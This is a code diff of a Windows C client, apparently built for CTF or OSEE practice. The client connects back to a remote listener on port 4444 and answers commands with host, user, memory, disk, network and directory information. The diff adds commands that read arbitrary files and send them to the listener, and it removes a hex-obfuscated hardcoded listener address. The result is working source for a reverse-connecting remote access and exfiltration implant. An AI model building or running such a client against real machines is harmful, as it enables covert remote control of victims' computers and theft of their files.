@@ -1,5 +1,5 @@
 /*
- * Windows Client for CTF/OSEE Preparation - Version 3
+ * Windows Client for CTF/OSEE Preparation - Version 4
  * Compile on Linux: x86_64-w64-mingw32-gcc -o client.exe client.c -lws2_32 -liphlpapi -static
  * Usage: client.exe <listener_ip> [port]
  */
@@ -18,14 +18,56 @@
 #define BUFFER_SIZE 16384
 #define DEFAULT_PORT 4444
 
-void from_hex(const char *hex, unsigned char *out) {
-    while (*hex) {
-        sscanf(hex, "%2hhx", out);
-        hex += 2;
-        out++;
+// Function declarations
+void read_file(char *filename, char *output, size_t output_size);
+void get_os_info(char *output, size_t size);
+void get_computer_info(char *output, size_t size);
+void get_memory_info(char *output, size_t size);
+void get_disk_info(char *output, size_t size);
+void get_network_info(char *output, size_t size);
+void get_system_info(char *output, size_t output_size);
+void get_directory_listing(char *output, size_t output_size);
+void handle_command(char *cmd, char *output, size_t output_size);
+
+// Read file content
+void read_file(char *filename, char *output, size_t output_size) {
+    FILE *file;
+    char line[1024];
+    size_t total_read = 0;
+    
+    memset(output, 0, output_size);
+    
+    file = fopen(filename, "rb");
+    if (file == NULL) {
+        snprintf(output, output_size, "[-] Failed to open file: %s\n", filename);
+        return;
     }
+    
+    snprintf(output, output_size, "\n=== File: %s ===\n\n", filename);
+    total_read = strlen(output);
+    
+    // Read file content
+    while (fgets(line, sizeof(line), file) != NULL && total_read < output_size - 1024) {
+        size_t line_len = strlen(line);
+        if (total_read + line_len < output_size - 1) {
+            strcat(output, line);
+            total_read += line_len;
+        } else {
+            strcat(output, "\n[...] File too large, truncated\n");
+            break;
+        }
+    }
+    
+    fclose(file);
+    
+    if (total_read == strlen(output)) {
+        strcat(output, "[!] File is empty\n");
+    }
+    
+    strcat(output, "\n=== End of File ===\n\n");
 }
 
+// Get OS information
 void get_os_info(char *output, size_t size) {
     OSVERSIONINFOEX osvi;
     SYSTEM_INFO si;
@@ -72,6 +114,7 @@ void get_os_info(char *output, size_t size) {
     strcat(output, temp);
 }
 
+// Get computer information
 void get_computer_info(char *output, size_t size) {
     char hostname[256];
     char username[256];
@@ -108,6 +151,7 @@ void get_computer_info(char *output, size_t size) {
     strcat(output, temp);
 }
 
+// Get memory information
 void get_memory_info(char *output, size_t size) {
     MEMORYSTATUSEX memInfo;
     char temp[512];
@@ -131,6 +175,7 @@ void get_memory_info(char *output, size_t size) {
     }
 }
 
+// Get disk information
 void get_disk_info(char *output, size_t size) {
     char temp[512];
     DWORD drives = GetLogicalDrives();
@@ -157,6 +202,7 @@ void get_disk_info(char *output, size_t size) {
     strcat(output, "\n");
 }
 
+// Get network information
 void get_network_info(char *output, size_t size) {
     char temp[512];
     PIP_ADAPTER_INFO pAdapterInfo;
@@ -206,6 +252,7 @@ void get_network_info(char *output, size_t size) {
     strcat(output, "\n");
 }
 
+// Get complete system information
 void get_system_info(char *output, size_t output_size) {
     memset(output, 0, output_size);
     
@@ -222,6 +269,7 @@ void get_system_info(char *output, size_t output_size) {
     get_network_info(output, output_size);
 }
 
+// Get directory listing
 void get_directory_listing(char *output, size_t output_size) {
     WIN32_FIND_DATA findData;
     HANDLE hFind;
@@ -263,6 +311,7 @@ void get_directory_listing(char *output, size_t output_size) {
     strcat(output, "\n");
 }
 
+// Handle commands
 void handle_command(char *cmd, char *output, size_t output_size) {
     char *trimmed_cmd = cmd;
     
@@ -275,6 +324,20 @@ void handle_command(char *cmd, char *output, size_t output_size) {
     }
     else if (strncmp(trimmed_cmd, "dir", 3) == 0) {
         get_directory_listing(output, output_size);
+    }
+    else if (strncmp(trimmed_cmd, "cat ", 4) == 0) {
+        char *filename = trimmed_cmd + 4;
+        while (*filename == ' ' || *filename == '\t') {
+            filename++;
+        }
+        read_file(filename, output, output_size);
+    }
+    else if (strncmp(trimmed_cmd, "type ", 5) == 0) {
+        char *filename = trimmed_cmd + 5;
+        while (*filename == ' ' || *filename == '\t') {
+            filename++;
+        }
+        read_file(filename, output, output_size);
     }
     else if (strncmp(trimmed_cmd, "cd ", 3) == 0) {
         char *path = trimmed_cmd + 3;
@@ -304,6 +367,7 @@ void handle_command(char *cmd, char *output, size_t output_size) {
     }
 }
 
+// Connect to listener
 int connect_to_listener(const char *host, int port) {
     WSADATA wsa;
     SOCKET sock;
@@ -388,11 +452,11 @@ int connect_to_listener(const char *host, int port) {
     return 0;
 }
 
+// Main function
 int main(int argc, char *argv[]) {
     char *host;
-    unsigned char HOST[256] = {0};
     int port = DEFAULT_PORT;
-/*    
+    
     if (argc < 2) {
         printf("Usage: %s <listener_ip> [port]\n", argv[0]);
         printf("Example: %s 192.168.1.100 4444\n", argv[0]);
@@ -403,16 +467,10 @@ int main(int argc, char *argv[]) {
     if (argc > 2) {
         port = atoi(argv[2]);
     }
-*/    
     
-    const char *hex = "3139322E3136382E3132322E31";
-    from_hex(hex, HOST);
-
-    host = HOST;
-
     printf("========================================\n");
-    printf("Windows Client - Version 3\n");
-    printf("File Browser + System Info\n");
+    printf("Windows Client - Version 4\n");
+    printf("File Browser + System Info + File Read\n");
     printf("========================================\n");
     
     while (1) {
